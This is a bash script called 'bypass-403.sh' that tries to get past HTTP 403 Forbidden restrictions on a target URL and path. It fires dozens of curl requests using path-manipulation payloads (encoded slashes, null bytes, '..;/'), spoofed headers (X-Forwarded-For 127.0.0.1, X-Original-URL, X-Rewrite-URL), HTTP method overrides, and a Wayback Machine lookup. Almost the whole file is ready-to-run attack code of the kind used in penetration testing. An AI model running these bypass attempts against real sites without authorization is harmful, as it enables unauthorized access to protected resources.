#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'
VIOLET='\033[38;2;138;43;226m'
ORANGE='\033[38;2;255;165;0m'
INDIGO='\033[38;2;75;0;130m'
DEEP_INDIGO='\033[38;2;48;0;102m'



# Add help menu
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    echo -e "${VIOLET}Usage: ./bypass-403.sh [URL] [path]"
    echo -e "Example: ./bypass-403.sh https://example.com admin\n"
	echo -e "Example: ./bypass-403.sh https://example.com admin/index.php\n"
	echo -e "Example: ./bypass-403.sh https://example.com server-status\n"
    echo -e "${CYAN}Options:${RESET}"
    echo -e "  -h, --help    Show this help menu"
    echo -e "\nThis tool attempts to bypass HTTP 403 forbidden errors using various path and header manipulation techniques."
    exit 0
fi

# Check for required arguments
if [[ $# -lt 2 ]]; then
    echo -e "${RED}Error: Missing required arguments.${RESET}"
    echo -e "Usage: ./bypass-403.sh [URL] [path]"
    exit 1
fi

# Add color to figlet
echo -e "${VIOLET}"
figlet -f slant Bypass-Four03
echo -e "${ORANGE}"
echo "                                               By nazmul__ethi"
echo "./bypass-403.sh $1 $2"
echo " "

echo -e "${VIOLET}PATH FUZZING${ORANGE}"
echo ""
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2f/$2
echo "  --> ${1}/%2f/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f/
echo "  --> ${1}/${2}/%2f/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%2f/
echo "  --> ${1}/${2}%2f/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2//%3B/
echo "  --> ${1}/${2}//%3B/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//%3B/$2
echo "  --> ${1}//%3B/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%00/$2
echo "  --> ${1}/%00/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%00/
echo "  --> ${1}/${2}%00/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%00/
echo "  --> ${1}/${2}/%00/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%0d/$2
echo "  --> ${1}/%0d/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%0d/
echo "  --> ${1}/${2}%0d/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%0d/
echo "  --> ${1}/${2}/%0d/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%23/$2
echo "  --> ${1}/%23/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%23/
echo "  --> ${1}/${2}%23/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23/
echo "  --> ${1}/${2}/%23/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/*/$2
echo "  --> ${1}/*/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2*/
echo "  --> ${1}/${2}*/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*/
echo "  --> ${1}/${2}/*/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%252e**/$2
echo "  --> ${1}/%252e**/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%252e**/
echo "  --> ${1}/${2}%252e**/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%252e**/
echo "  --> ${1}/${2}/%252e**/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%ef%bc%8f/$2
echo "  --> ${1}/%ef%bc%8f/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%ef%bc%8f/
echo "  --> ${1}/${2}%ef%bc%8f/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%ef%bc%8f/
echo "  --> ${1}/${2}/%ef%bc%8f/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2
echo "  --> ${1}//${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2
echo "  --> ${1}/./${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
echo ""
echo -e "${VIOLET}HEADER FUZZING${YELLOW}"
echo ""
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-Addr: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "True-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H True-Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Cluster-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Cluster-Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Remote-Addr: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: localhost" $1/$2
echo "  --> ${1}/${2} -H Host: localhost"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /admin/console" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: /admin/console"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: /admin/console" $1/$2
echo "  --> ${1}/${2} -H X-Rewrite-URL: /admin/console"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /admin/" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: /admin/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: /admin/" $1/$2
echo "  --> ${1}/${2} -H X-Rewrite-URL: /admin/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /admin/" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: admin"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: /admin/" $1/$2
echo "  --> ${1}/${2} -H X-Rewrite-URL: admin"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: PUT" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: POST" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: HEAD" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: HEAD"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: TRACE" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: CONNECT" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: CONNECT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: PATCH" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Method-Override: PATCH"
echo ""
echo -e "${VIOLET}HTTP METHOD FUZZING${VIOLET}"
echo ""
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PUT $1/$2
echo "  --> ${1}/${2} -X PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X POST $1/$2
echo "  --> ${1}/${2} -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X HEAD $1/$2
echo "  --> ${1}/${2} -X HEAD"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X CONNECT $1/$2
echo "  --> ${1}/${2} -X CONNECT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PATCH $1/$2
echo "  --> ${1}/${2} -X PATCH"
#HTTP Protocol version FUZZING
echo ""
echo -e "${VIOLET}Way back machine${RESET}"
echo ""
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'

